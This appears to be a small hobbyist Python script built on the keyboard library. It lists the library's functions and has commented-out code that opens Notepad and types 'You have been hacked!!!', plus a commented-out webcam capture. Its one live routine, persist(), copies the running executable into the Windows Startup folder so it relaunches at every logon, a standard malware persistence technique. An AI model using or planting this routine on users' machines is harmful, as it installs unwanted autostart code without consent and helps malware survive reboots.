import keyboard
import time
import sys
import os
import shutil

"""
['KEY_DOWN', 'KEY_UP', 'KeyboardEvent', 'add_abbreviation', 'add_hotkey', 'add_word_listener', 'all_modifiers', 'block_key', 'call_later', 'clear_all_hotkeys', 'clear_hotkey', 'get_hotkey_name', 'get_typed_strings', 'hook', 'hook_key', 'is_modifier', 'is_pressed', 'key_to_scan_codes', 'normalize_name', 'on_press', 'on_press_key', 'on_release', 'on_release_key', 'parse_hotkey', 'parse_hotkey_combinations', 'play', 'press', 'press_and_release', 'read_event', 'read_hotkey', 'read_key', 'record', 'register_abbreviation', 'register_homap_hotkey', 'remap_key', 'remove_abbreviation', 'remove_all_hotkeys', 'remove_hotkey', 'remove_wordtkey', 'register_word_listener', 'release', 're_listener', 'replay', 'restore_modifiers', 'restore_state', 'send', 'sided_modifiers', 'start_recording', 'stash_state', 'stop_recording', 'unblock_key', 'unhook', 'unhook_all', 'unhook_all_hotkeys', 'unhook_key', 'unregister_all_hotkeys', 'unregister_hotkey', 'unremap_hotkey', 'unremap_key', 'version', 'wait', 'write']
"""

# keyboard.press("left windows")
# keyboard.press("r")
# keyboard.release("left windows")
# keyboard.release("r")
# keyboard.write("notepad")
# keyboard.press_and_release("enter")
# print("hello")
# keyboard.write("You have been hacked!!!")



#key = keyboard.read_key()
#print(key)

# cap = cv2.VideoCapture()
# while True:
#   _, frame = cap.read()
#   cv2.imshow("frame", frame)

def persist():
    folder = "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    file_location = os.environ['AppData']
    file_path = os.path.join(file_location, folder)
    file = os.path.join(file_path, os.path.split(sys.executable)[1])
    if not os.path.exists(file):
        shutil.copy(sys.executable, file_path)
        print('\n[+] created persistence')
    else:
        print('\n[+] persistence already existed')
    
persist()





